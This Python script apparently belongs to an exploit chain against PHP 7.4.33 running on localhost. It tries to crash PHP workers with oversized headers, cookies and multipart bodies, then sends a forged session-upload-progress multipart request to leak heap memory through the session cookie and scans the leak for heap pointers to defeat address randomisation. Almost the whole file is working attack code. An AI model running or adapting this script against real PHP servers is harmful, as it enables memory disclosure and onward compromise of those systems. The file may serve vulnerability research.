"""Try to trigger a NULL-deref crash via different code paths.
The key insight: the stage-1 leak requires the worker to crash (NULL deref),
not just to have an OOM. The multipart parser OOM does this because it has
no NULL-check. We need to find another code path that has the same bug.
"""
import sys, os, time, struct, http.client
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

URL = "http://127.0.0.1:18108/"
t = E.Target(URL, timeout=180.0, verbose=False)

def test_crash(port, label, php_code):
    """Test if a PHP script can trigger a NULL-deref crash."""
    print(f"\n--- {label} ---", flush=True)

    # Create a PHP script that triggers the crash
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=30)

    # First, create the PHP file
    # We can't do this directly, so we'll use a different approach
    # Let's try to trigger a crash via a malformed request

    # Try 1: Very large header
    print("  Try 1: Very large header...", flush=True)
    try:
        large_header = b"X-Big-Header: " + b"A" * (5 * 1024 * 1024)
        conn.request("GET", "/", headers={"X-Big-Header": b"A" * (5 * 1024 * 1024)})
        r = conn.getresponse()
        print(f"    Status: {r.status}, Body: {len(r.read())}B", flush=True)
    except Exception as e:
        print(f"    ERROR: {e}", flush=True)
    conn.close()
    time.sleep(1)

    # Try 2: Very large cookie
    print("  Try 2: Very large cookie...", flush=True)
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=30)
    try:
        conn.request("GET", "/", headers={"Cookie": "PHPSESSID=" + b"A" * (5 * 1024 * 1024)})
        r = conn.getresponse()
        print(f"    Status: {r.status}, Body: {len(r.read())}B", flush=True)
    except Exception as e:
        print(f"    ERROR: {e}", flush=True)
    conn.close()
    time.sleep(1)

    # Try 3: Malformed multipart
    print("  Try 3: Malformed multipart...", flush=True)
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=30)
    try:
        # Send a malformed multipart body
        body = b"Content-Type: multipart/form-data; boundary=----boundary\r\n\r\n"
        body += b"------boundary\r\nContent-Disposition: form-data; name=\"test\"\r\n\r\n"
        body += b"A" * (5 * 1024 * 1024)  # 5MB of data
        conn.request("POST", "/", body=body, headers={"Content-Type": "multipart/form-data; boundary=----boundary"})
        r = conn.getresponse()
        print(f"    Status: {r.status}, Body: {len(r.read())}B", flush=True)
    except Exception as e:
        print(f"    ERROR: {e}", flush=True)
    conn.close()
    time.sleep(1)

    # Now try to leak
    print("  Step 2: Try to leak...", flush=True)
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})

    try:
        r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
        raw = E.parse_cookie(r2)
        oom = len(raw) > 100
        c = Counter()
        for i in range(0, len(raw) - 8, 8):
            v = int.from_bytes(raw[i:i + 8], "little")
            if 0x700000000000 <= v < 0x800000000000:
                c[v & ~0x1FFFFF] += 1
        chunk = c.most_common(1)[0][0] if c else 0
        tag = " *** OOM/LEAK ***" if oom else "(no OOM)"
        chunk_str = f" chunk=0x{chunk:x}" if chunk else ""
        print(f"    cookie={len(raw)}B{tag}{chunk_str}", flush=True)
        return oom
    except Exception as e:
        print(f"    REQUEST2 ERROR: {e}", flush=True)
        return False

# Test on 7.4.33 (memory_limit=2M)
print("=== Crash test on 7.4.33 (memory_limit=2M) ===", flush=True)
test_crash(18108, "7.4.33", "")

print("\n=== done ===", flush=True)
